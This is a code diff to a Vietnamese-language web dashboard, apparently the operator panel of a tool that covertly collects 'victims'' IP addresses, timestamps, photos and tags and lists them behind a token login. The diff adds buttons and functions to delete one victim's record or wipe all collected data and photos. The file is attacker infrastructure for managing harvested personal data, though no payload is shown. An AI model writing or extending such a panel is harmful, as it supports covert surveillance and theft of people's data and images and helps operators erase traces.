@@ -40,7 +40,10 @@ pre{background:#0d1117;padding:10px;border-radius:6px;overflow-x:auto;font-size:
 <div id="dash">
   <div class="header-bar">
     <h2>📊 Victims (<span id="cnt">0</span>)</h2>
-    <button class="btn-logout" onclick="logout()">Đăng xuất</button>
+    <div style="display:flex;gap:8px">
+      <button class="btn-logout" style="background:#b83232" onclick="deleteAll()">🗑 Xoá tất cả</button>
+      <button class="btn-logout" onclick="logout()">Đăng xuất</button>
+    </div>
   </div>
   <div id="list"></div>
 </div>
@@ -85,6 +88,8 @@ async function loadDash(){
     const r = await fetch('/api/victims',{ headers:{ 'x-token': TOKEN } });
     if(!r.ok){ logout(); return; }
     const data = await r.json();
+    window.__victims = data;
+
     document.getElementById('loginBox').style.display = 'none';
     document.getElementById('dash').style.display = 'block';
     document.getElementById('cnt').textContent = data.length;
@@ -112,7 +117,10 @@ async function loadDash(){
       return `<div class="card">
         <div class="card-head">
           <span class="ip">#${i+1} — ${v.ip || '?'}</span>
-          <span>${v.time || ''}</span>
+          <span style="display:flex;gap:8px;align-items:center">
+            ${v.time || ''}
+            <button onclick="deleteOne(${i})" style="background:#b83232;border:none;color:#fff;padding:4px 10px;border-radius:5px;cursor:pointer;font-size:11px;width:auto">🗑 Xoá</button>
+          </span>
         </div>
         ${photo}
         <div>${tags.map(t=>`<span class="tag">${t}</span>`).join('')}</div>
@@ -124,12 +132,34 @@ async function loadDash(){
   }
 }
 
-// Enter để login
+async function deleteOne(index){
+  const v = window.__victims[index];
+  if(!v) return alert('Không tìm thấy');
+  if(!confirm('Xoá victim ' + v.ip + ' — ' + v.time + '?')) return;
+  try{
+    const url = '/api/victim?time=' + encodeURIComponent(v.time) + '&ip=' + encodeURIComponent(v.ip);
+    const r = await fetch(url, { method: 'DELETE', headers: { 'x-token': TOKEN } });
+    const d = await r.json();
+    if(d.ok) loadDash();
+    else alert('Xoá thất bại');
+  }catch(e){ alert('Lỗi: ' + e.message); }
+}
+
+async function deleteAll(){
+  if(!confirm('Xoá TOÀN BỘ data + ảnh? Không hoàn tác!')) return;
+  if(!confirm('Chắc chắn chưa?')) return;
+  try{
+    const r = await fetch('/api/victims', { method: 'DELETE', headers: { 'x-token': TOKEN } });
+    const d = await r.json();
+    if(d.ok) loadDash();
+    else alert('Xoá thất bại');
+  }catch(e){ alert('Lỗi: ' + e.message); }
+}
+
 document.getElementById('p').addEventListener('keydown', e => {
   if(e.key === 'Enter') doLogin();
 });
 
-// Auto check token nếu có
 if(TOKEN) loadDash();
 </script>
 </body>
